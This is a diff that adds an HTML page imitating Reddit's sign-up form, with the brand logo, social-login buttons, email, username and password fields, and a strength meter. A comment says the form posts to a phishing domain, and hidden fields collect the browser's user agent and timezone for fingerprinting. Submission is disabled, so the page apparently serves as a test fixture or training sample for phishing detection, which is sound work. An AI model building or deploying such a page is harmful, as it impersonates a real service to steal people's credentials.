@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Reddit - Sign Up</title>
+  <link rel="icon" href="https://www.redditstatic.com/shreddit/assets/favicon/64x64.png" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap');
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #dae0e6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── Header ── */
+    .reddit-header {
+      background: #fff;
+      border-bottom: 1px solid #edeff1;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      gap: 12px;
+      flex-shrink: 0;
+    }
+
+    .logo-wrap { display: flex; align-items: center; gap: 8px; }
+    .logo-svg { height: 26px; width: auto; color: #ff4500; }
+
+    .header-right {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .btn-login {
+      border: 1px solid #ff4500;
+      color: #ff4500;
+      background: transparent;
+      border-radius: 20px;
+      padding: 6px 18px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+    }
+
+    /* ── Page body ── */
+    .page-body {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 16px;
+    }
+
+    /* ── Card ── */
+    .card {
+      background: #fff;
+      border-radius: 4px;
+      width: 100%;
+      max-width: 440px;
+      display: flex;
+      overflow: hidden;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.12);
+    }
+
+    /* ── Snoo sidebar ── */
+    .card-sidebar {
+      width: 64px;
+      background: linear-gradient(180deg, #ff6534 0%, #ff4500 40%, #ff6534 100%);
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 24px;
+    }
+
+    /* ── Form area ── */
+    .card-body {
+      flex: 1;
+      padding: 28px 32px 24px;
+    }
+
+    .card-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #1c1c1c;
+      margin-bottom: 4px;
+    }
+
+    .card-subtitle {
+      font-size: 12px;
+      color: #576f76;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .card-subtitle a { color: #ff4500; font-weight: 700; text-decoration: none; }
+    .card-subtitle a:hover { text-decoration: underline; }
+
+    /* ── Social buttons ── */
+    .social-btn {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border: 1px solid #edeff1;
+      border-radius: 20px;
+      padding: 10px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      background: #fff;
+      color: #1c1c1c;
+      margin-bottom: 8px;
+      font-family: inherit;
+      transition: border-color 0.15s;
+    }
+
+    .social-btn:hover { border-color: #878a8c; background: #f6f7f8; }
+
+    .social-btn img { width: 20px; height: 20px; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 16px 0;
+      font-size: 12px;
+      font-weight: 700;
+      color: #878a8c;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #edeff1;
+    }
+
+    /* ── Form fields ── */
+    .field { margin-bottom: 16px; }
+
+    .field label {
+      display: block;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #576f76;
+      margin-bottom: 6px;
+    }
+
+    .field input {
+      width: 100%;
+      border: 1px solid #edeff1;
+      border-radius: 4px;
+      padding: 10px 14px;
+      font-size: 14px;
+      color: #1c1c1c;
+      outline: none;
+      font-family: inherit;
+      background: #f6f7f8;
+      transition: border-color 0.15s, background 0.15s;
+    }
+
+    .field input:focus {
+      border-color: #0dd3bb;
+      background: #fff;
+    }
+
+    .field input::placeholder { color: #878a8c; }
+
+    .field-hint {
+      font-size: 11px;
+      color: #878a8c;
+      margin-top: 4px;
+    }
+
+    /* ── Password strength ── */
+    .strength-bar {
+      height: 4px;
+      border-radius: 2px;
+      background: #edeff1;
+      margin-top: 6px;
+      overflow: hidden;
+    }
+
+    .strength-fill {
+      height: 100%;
+      width: 0%;
+      border-radius: 2px;
+      background: #ff4500;
+      transition: width 0.2s, background 0.2s;
+    }
+
+    /* ── Checkbox ── */
+    .checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .checkbox-row input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      margin-top: 1px;
+      flex-shrink: 0;
+      accent-color: #ff4500;
+      cursor: pointer;
+    }
+
+    .checkbox-row span {
+      font-size: 12px;
+      color: #576f76;
+      line-height: 1.5;
+    }
+
+    .checkbox-row a { color: #0079d3; text-decoration: none; }
+    .checkbox-row a:hover { text-decoration: underline; }
+
+    /* ── Submit ── */
+    .btn-submit {
+      width: 100%;
+      background: #ff4500;
+      color: #fff;
+      border: none;
+      border-radius: 20px;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+    }
+
+    .btn-submit:hover { background: #e03d00; }
+    .btn-submit:active { background: #c93500; }
+
+    .login-prompt {
+      text-align: center;
+      font-size: 13px;
+      color: #576f76;
+      margin-top: 16px;
+    }
+
+    .login-prompt a { color: #ff4500; font-weight: 700; text-decoration: none; }
+    .login-prompt a:hover { text-decoration: underline; }
+
+    /* ── Snoo SVG ── */
+    .snoo {
+      width: 40px;
+      height: 40px;
+    }
+  </style>
+</head>
+<body>
+
+<header class="reddit-header">
+  <div class="logo-wrap">
+    <svg class="logo-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 514 149">
+      <g style="fill: currentColor">
+        <path d="m71.62,45.92l-12.01,28.56c-1.51-.76-5.11-1.61-8.51-1.61s-6.81.85-10.12,2.46c-6.53,3.31-11.35,9.93-11.35,19.48v52.3H-.26V45.35h29.04v14.28h.57c6.81-9.08,17.21-15.79,30.74-15.79,4.92,0,9.65.95,11.54,2.08Z"/>
+        <path d="m65.84,96.52c0-29.41,20.15-52.68,50.32-52.68,27.33,0,46.91,19.96,46.91,48.05,0,4.92-.47,9.55-1.51,14h-68.48c3.12,10.69,12.39,19.01,26.29,19.01,7.66,0,18.54-2.74,24.4-7.28l9.27,22.32c-8.61,5.86-21.75,8.7-33.29,8.7-32.25,0-53.91-20.81-53.91-52.11Zm26.67-9.36h43.03c0-13.05-8.89-19.96-19.77-19.96-12.3,0-20.62,7.94-23.27,19.96Z"/>
+        <path d="m419.53-.37c10.03,0,18.25,8.23,18.25,18.25s-8.23,18.25-18.25,18.25-18.25-8.23-18.25-18.25S409.51-.37,419.53-.37Zm14.94,147.49h-29.89V45.35h29.89v101.77Z"/>
+        <path d="m246,1.47l-.09,53.53h-.57c-8.23-7.85-17.12-11.07-28.75-11.07-28.66,0-47.67,23.08-47.67,52.3s17.78,52.4,46.72,52.4c12.11,0,23.55-4.16,30.93-13.62h.85v12.11h28.47V1.47h-29.89Zm1.42,121.39h-.99l-6.67-6.93c-4.34,4.33-10.28,6.93-17.22,6.93-14.64,0-24.88-11.58-24.88-26.6s10.24-26.6,24.88-26.6,24.88,11.58,24.88,26.6v26.6Z"/>
+        <path d="m360.15,1.47l-.09,53.53h-.57c-8.23-7.85-17.12-11.07-28.75-11.07-28.66,0-47.67,23.08-47.67,52.3s17.78,52.4,46.72,52.4c12.11,0,23.55-4.16,30.93-13.62h.85v12.11h28.47V1.47h-29.89Zm1.28,121.39h-.99l-6.67-6.93c-4.34,4.33-10.28,6.93-17.22,6.93-14.64,0-24.88-11.58-24.88-26.6s10.24-26.6,24.88-26.6,24.88,11.58,24.88,26.6v26.6Z"/>
+        <path d="m492.44,45.35h21.85v25.44h-21.85v76.33h-29.89v-76.33h-21.75v-25.44h21.75v-27.66h29.89v27.66Z"/>
+      </g>
+    </svg>
+  </div>
+  <div class="header-right">
+    <button class="btn-login">Log In</button>
+  </div>
+</header>
+
+<div class="page-body">
+  <div class="card">
+
+    <!-- Orange sidebar with Snoo -->
+    <div class="card-sidebar">
+      <svg class="snoo" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="10" cy="10" r="10" fill="rgba(255,255,255,0.2)"/>
+        <path fill="#fff" d="M16.67 10a1.46 1.46 0 0 0-2.47-1 7.12 7.12 0 0 0-3.85-1.23l.65-3.08 2.13.45a1 1 0 1 0 1-.97 1 1 0 0 0-.96.68l-2.38-.5a.16.16 0 0 0-.19.12l-.73 3.44a7.14 7.14 0 0 0-3.89 1.23 1.46 1.46 0 1 0-1.61 2.39 2.87 2.87 0 0 0 0 .44c0 2.24 2.61 4.06 5.83 4.06s5.83-1.82 5.83-4.06a2.87 2.87 0 0 0 0-.44 1.46 1.46 0 0 0 .64-1.53zM7.27 11a1 1 0 1 1 1 1 1 1 0 0 1-1-1zm5.58 2.65a3.56 3.56 0 0 1-2.85.89 3.56 3.56 0 0 1-2.85-.89.19.19 0 0 1 .27-.27 3.21 3.21 0 0 0 2.58.73 3.21 3.21 0 0 0 2.58-.73.19.19 0 0 1 .27.27zm-.17-1.65a1 1 0 1 1 1-1 1 1 0 0 1-1 1z"/>
+      </svg>
+    </div>
+
+    <!-- Form -->
+    <div class="card-body">
+      <div class="card-title">Sign Up</div>
+      <div class="card-subtitle">
+        By continuing, you agree to our <a href="#">User Agreement</a> and acknowledge that you understand the <a href="#">Privacy Policy</a>.
+      </div>
+
+      <!-- Social sign-up -->
+      <button class="social-btn">
+        <img src="https://www.google.com/favicon.ico" alt="Google" />
+        Continue with Google
+      </button>
+      <button class="social-btn">
+        <img src="https://www.apple.com/favicon.ico" alt="Apple" />
+        Continue with Apple
+      </button>
+
+      <div class="divider">OR</div>
+
+      <!-- Sign-up form — action points to phishing domain -->
+      <form action="http://ribbit.com/register/collect" method="POST" onsubmit="return false;">
+
+        <div class="field">
+          <label>Email</label>
+          <input type="email" name="email" placeholder="Email" autocomplete="off" />
+        </div>
+
+        <div class="field">
+          <label>Username</label>
+          <input type="text" name="username" placeholder="Username" autocomplete="off" />
+          <div class="field-hint">Reddit is anonymous. Your username is how other community members will see you.</div>
+        </div>
+
+        <div class="field">
+          <label>Password</label>
+          <input type="password" name="password" placeholder="Password" id="pw-input" autocomplete="new-password" oninput="updateStrength(this.value)" />
+          <div class="strength-bar"><div class="strength-fill" id="strength-fill"></div></div>
+        </div>
+
+        <!-- Hidden fingerprint fields -->
+        <input type="hidden" name="ua" id="h-ua" />
+        <input type="hidden" name="tz" id="h-tz" />
+        <input type="hidden" name="ref" value="signup_page" />
+
+        <div class="checkbox-row">
+          <input type="checkbox" id="tos" />
+          <span>I agree to Reddit's <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>. Reddit may use my email for promotional messages.</span>
+        </div>
+
+        <button type="submit" class="btn-submit">Continue</button>
+      </form>
+
+      <div class="login-prompt">
+        Already a redditor? <a href="#">Log In</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  document.getElementById('h-ua').value = navigator.userAgent;
+  document.getElementById('h-tz').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  function updateStrength(val) {
+    const fill = document.getElementById('strength-fill');
+    let score = 0;
+    if (val.length >= 8) score++;
+    if (/[A-Z]/.test(val)) score++;
+    if (/[0-9]/.test(val)) score++;
+    if (/[^A-Za-z0-9]/.test(val)) score++;
+    const pct = [0, 25, 50, 75, 100][score];
+    const colors = ['#ff4500', '#ff4500', '#ffb000', '#46d160', '#46d160'];
+    fill.style.width = pct + '%';
+    fill.style.background = colors[score];
+  }
+</script>
+</body>
+</html>
